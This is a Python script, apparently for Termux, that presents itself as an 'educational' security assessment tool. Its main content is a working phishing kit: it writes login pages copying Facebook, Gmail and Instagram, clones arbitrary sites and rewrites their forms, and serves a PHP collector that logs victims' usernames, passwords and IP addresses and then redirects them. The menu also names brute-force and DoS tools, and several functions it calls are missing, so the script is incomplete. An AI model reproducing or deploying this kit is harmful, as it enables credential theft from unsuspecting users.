import os
import sys
import time
import socket
import random
import subprocess
import threading
import requests
from datetime import datetime
from pyngrok import ngrok

# ANSI colors for better UI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Banner display
def display_banner():
    banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  {Colors.GREEN}███████╗███████╗ ██████╗████████╗ ██████╗  ██████╗ ██╗     {Colors.BLUE}║
║  {Colors.GREEN}██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     {Colors.BLUE}║
║  {Colors.GREEN}███████╗█████╗  ██║        ██║   ██║   ██║██║   ██║██║     {Colors.BLUE}║
║  {Colors.GREEN}╚════██║██╔══╝  ██║        ██║   ██║   ██║██║   ██║██║     {Colors.BLUE}║
║  {Colors.GREEN}███████║███████╗╚██████╗   ██║   ╚██████╔╝╚██████╔╝███████╗{Colors.BLUE}║
║  {Colors.GREEN}╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝{Colors.BLUE}║
║                                                          ║
║  {Colors.WARNING}Security Assessment Tool v1.0                       {Colors.BLUE}║
║  {Colors.WARNING}For Educational & Authorized Testing Only           {Colors.BLUE}║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
"""
    print(banner)

# Function to clear the screen
def clear_screen():
    os.system('clear')

# Phishing tool function
def phishing_tool():
    clear_screen()
    print(f"{Colors.HEADER}====== Phishing Tool ======{Colors.ENDC}")
    print(f"{Colors.BLUE}This module creates phishing pages for educational purposes.{Colors.ENDC}")
    print(f"{Colors.WARNING}WARNING: Only use for authorized security testing!{Colors.ENDC}\n")
    
    template = input(f"{Colors.GREEN}Select template:\n1. Facebook\n2. Gmail\n3. Instagram\n4. Custom\nYour choice (1-4): {Colors.ENDC}")
    port = input(f"{Colors.GREEN}Enter port to host phishing page (default: 8080): {Colors.ENDC}")
    
    if not port:
        port = "8080"
    
    # Create directory for phishing page
    phish_dir = "/data/data/com.termux/files/home/phishing"
    if not os.path.exists(phish_dir):
        os.makedirs(phish_dir)
    
    # Select template
    template_html = ""
    template_name = ""
    
    if template == "1":
        template_name = "Facebook"
        template_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In or Sign Up</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }
                .container { width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; }
                .logo { text-align: center; margin-bottom: 20px; }
                .logo img { width: 240px; }
                .form { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 5px; box-sizing: border-box; }
                button { width: 100%; background-color: #1877f2; color: white; padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
                .forgot { text-align: center; margin: 15px 0; }
                .forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
                .create { text-align: center; margin-top: 20px; }
                .create button { background-color: #42b72a; font-size: 17px; padding: 10px; width: auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                </div>
                <div class="form">
                    <form action="collect.php" method="post">
                        <input type="text" name="email" placeholder="Email address or phone number" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                        <div class="forgot">
                            <a href="#">Forgotten password?</a>
                        </div>
                        <hr>
                        <div class="create">
                            <button type="button">Create New Account</button>
                        </div>
                    </form>
                </div>
            </div>
        </body>
        </html>
        """
    
    elif template == "2":
        template_name = "Gmail"
        template_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Gmail - Sign in</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Google Sans', Arial, sans-serif; margin: 0; padding: 0; background-color: #fff; }
                .container { width: 100%; max-width: 450px; margin: 0 auto; padding: 40px 20px; text-align: center; }
                .logo { margin-bottom: 25px; }
                .logo img { width: 75px; }
                h1 { font-weight: 400; margin-bottom: 12px; }
                h2 { font-weight: 400; font-size: 16px; margin-bottom: 40px; }
                .form { text-align: left; }
                input { width: 100%; padding: 13px 15px; margin: 8px 0 25px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
                input:focus { outline: none; border: 2px solid #1a73e8; }
                button { background-color: #1a73e8; color: white; padding: 10px 25px; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; float: right; }
                .links { margin-top: 60px; font-size: 14px; }
                .links a { color: #1a73e8; text-decoration: none; margin: 0 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
                </div>
                <h1>Sign in</h1>
                <h2>Continue to Gmail</h2>
                <div class="form">
                    <form action="collect.php" method="post">
                        <label for="email">Email or phone</label>
                        <input type="text" id="email" name="email" required>
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                        <button type="submit">Next</button>
                    </form>
                </div>
                <div class="links">
                    <a href="#">Create account</a>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </body>
        </html>
        """
    
    elif template == "3":
        template_name = "Instagram"
        template_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Instagram - Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #fafafa; }
                .container { width: 100%; max-width: 350px; margin: 0 auto; padding: 40px 20px; }
                .logo { text-align: center; margin-bottom: 30px; }
                .logo img { width: 175px; }
                .form { background-color: white; padding: 20px; border: 1px solid #dbdbdb; border-radius: 1px; margin-bottom: 10px; }
                input { width: 100%; padding: 9px 8px; margin: 5px 0; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
                button { width: 100%; background-color: #0095f6; color: white; padding: 7px; border: none; border-radius: 4px; font-weight: 600; margin-top: 10px; cursor: pointer; }
                .or { text-align: center; margin: 15px 0; position: relative; }
                .or:before, .or:after { content: ""; position: absolute; height: 1px; width: 40%; background-color: #dbdbdb; top: 50%; }
                .or:before { left: 0; }
                .or:after { right: 0; }
                .facebook { text-align: center; margin: 15px 0; }
                .facebook a { color: #385185; text-decoration: none; font-weight: 600; font-size: 14px; }
                .forgot { text-align: center; margin: 15px 0; }
                .forgot a { color: #385185; text-decoration: none; font-size: 12px; }
                .signup { background-color: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; }
                .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
                </div>
                <div class="form">
                    <form action="collect.php" method="post">
                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                        <div class="or">OR</div>
                        <div class="facebook">
                            <a href="#">Log in with Facebook</a>
                        </div>
                        <div class="forgot">
                            <a href="#">Forgot password?</a>
                        </div>
                    </form>
                </div>
                <div class="signup">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
        </body>
        </html>
        """
    
    elif template == "4":
        template_name = "Custom"
        site_to_clone = input(f"{Colors.GREEN}Enter URL to clone (e.g., https://example.com): {Colors.ENDC}")
        print(f"{Colors.BLUE}Attempting to clone {site_to_clone}...{Colors.ENDC}")
        try:
            os.system(f"wget -O {phish_dir}/index.html {site_to_clone}")
            # Replace form action to point to our collector
            os.system(f"sed -i 's/<form[^>]*action=\"[^\"]*\"/<form action=\"collect.php\"/g' {phish_dir}/index.html")
            template_html = "CUSTOM_TEMPLATE"
            print(f"{Colors.GREEN}Site cloned successfully!{Colors.ENDC}")
        except:
            print(f"{Colors.FAIL}Failed to clone site. Using a simple template instead.{Colors.ENDC}")
            template_name = "Custom Generic"
            template_html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f2f2f2; }
                    .container { width: 100%; max-width: 400px; margin: 0 auto; padding: 40px 20px; }
                    .form { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); }
                    h2 { text-align: center; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }
                    button { width: 100%; background-color: #4CAF50; color: white; padding: 10px; border: none; border-radius: 3px; cursor: pointer; }
                    .links { text-align: center; margin-top: 15px; }
                    .links a { color: #666; text-decoration: none; font-size: 14px; margin: 0 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="form">
                        <h2>Account Login</h2>
                        <form action="collect.php" method="post">
                            <input type="text" name="username" placeholder="Username or Email" required>
                            <input type="password" name="password" placeholder="Password" required>
                            <button type="submit">Log In</button>
                        </form>
                        <div class="links">
                            <a href="#">Forgot password?</a>
                            <a href="#">Create account</a>
                        </div>
                    </div>
                </div>
            </body>
            </html>
            """
    
    else:
        print(f"{Colors.FAIL}Invalid option selected! Using generic template.{Colors.ENDC}")
        template_name = "Generic"
        template_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
                body { font-family: Arial; margin: 0; padding: 20px; }
                .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
                input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
                button { background-color: #4285f4; color: white; padding: 10px 15px; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="login-form">
                <h2>Please Log In</h2>
                <form action="collect.php" method="post">
                    <input type="text" name="username" placeholder="Username" required><br>
                    <input type="password" name="password" placeholder="Password" required><br>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        """
    
    # Create PHP collector script
    collector_php = """
    <?php
    $file = fopen("collected_data.txt", "a");
    fwrite($file, "------- New Data -------\\n");
    fwrite($file, "Date: " . date("Y-m-d H:i:s") . "\\n");
    fwrite($file, "IP: " . $_SERVER["REMOTE_ADDR"] . "\\n");
    
    foreach ($_POST as $key => $value) {
        fwrite($file, $key . ": " . $value . "\\n");
    }
    
    fwrite($file, "------- End -------\\n\\n");
    fclose($file);
    
    // Redirect to the real site
    header("Location: https://www.google.com");
    exit;
    ?>
    """
    
    # Write files
    if template_html != "CUSTOM_TEMPLATE":
        with open(f"{phish_dir}/index.html", "w") as f:
            f.write(template_html)
    
    with open(f"{phish_dir}/collect.php", "w") as f:
        f.write(collector_php)
    
    # Start PHP server
    print(f"{Colors.GREEN}Setting up phishing page ({template_name}) on port {port}...{Colors.ENDC}")
    print(f"{Colors.GREEN}Page will be available at: http://localhost:{port}{Colors.ENDC}")
    print(f"{Colors.GREEN}Data will be saved to: {phish_dir}/collected_data.txt{Colors.ENDC}")
    print(f"{Colors.WARNING}Press Ctrl+C to stop the server when finished.{Colors.ENDC}")
    
    try:
        os.chdir(phish_dir)
        os.system(f"php -S 0.0.0.0:{port}")
    except KeyboardInterrupt:
        pass
    
    input(f"\n{Colors.WARNING}Press Enter to return to the main menu...{Colors.ENDC}")

# Main menu
def main_menu():
    while True:
        clear_screen()
        display_banner()
        print(f"{Colors.HEADER}====== Main Menu ======{Colors.ENDC}")
        print(f"{Colors.BLUE}1. Vulnerability Scanner{Colors.ENDC}")
        print(f"{Colors.BLUE}2. Brute Force Attack Tool{Colors.ENDC}")
        print(f"{Colors.BLUE}3. DoS Attack Simulator{Colors.ENDC}")
        print(f"{Colors.BLUE}4. Phishing Tool{Colors.ENDC}")
        print(f"{Colors.BLUE}5. Network Analysis Tool{Colors.ENDC}")
        print(f"{Colors.BLUE}6. Anonymity Tools{Colors.ENDC}")
        print(f"{Colors.BLUE}7. Exit{Colors.ENDC}")
        
        choice = input(f"{Colors.GREEN}Select an option (1-7): {Colors.ENDC}")
        
        if choice == "1":
            vulnerability_scan()
        elif choice == "2":
            brute_force_attack()
        elif choice == "3":
            dos_attack()
        elif choice == "4":
            phishing_tool()
        elif choice == "5":
            network_analysis()
        elif choice == "6":
            anonymity_tools()
        elif choice == "7":
            print(f"{Colors.GREEN}Exiting...{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}Invalid option selected!{Colors.ENDC}")
            time.sleep(1)

# Entry point
if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}This tool requires root privileges. Run with sudo!{Colors.ENDC}")
        sys.exit(1)
    
    check_dependencies()
    main_menu()
